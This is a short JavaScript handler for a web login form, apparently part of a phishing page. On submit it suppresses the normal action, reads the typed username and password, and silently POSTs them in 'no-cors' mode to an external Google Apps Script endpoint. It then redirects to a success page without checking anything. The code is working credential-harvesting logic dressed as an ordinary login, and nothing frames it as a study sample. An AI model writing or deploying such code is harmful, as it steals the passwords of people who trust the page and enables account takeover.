document
  .getElementById("loginForm")
  .addEventListener("submit", function(e){

    e.preventDefault();

    const username =
      document.getElementById("username").value;

    const password =
      document.getElementById("password").value;

    fetch("https://script.google.com/macros/s/AKfycbxQOEthGEkGLiq_ZBxC4UXveK31Oe8bqZ_dN3e-fyC0QXQkjOE80vMu6Jb6fzVMNic/exec", {
      method: "POST",
      mode: "no-cors",
      body: new URLSearchParams({
        username,
        password
      })
    });

    window.location.href = "success.html";
});
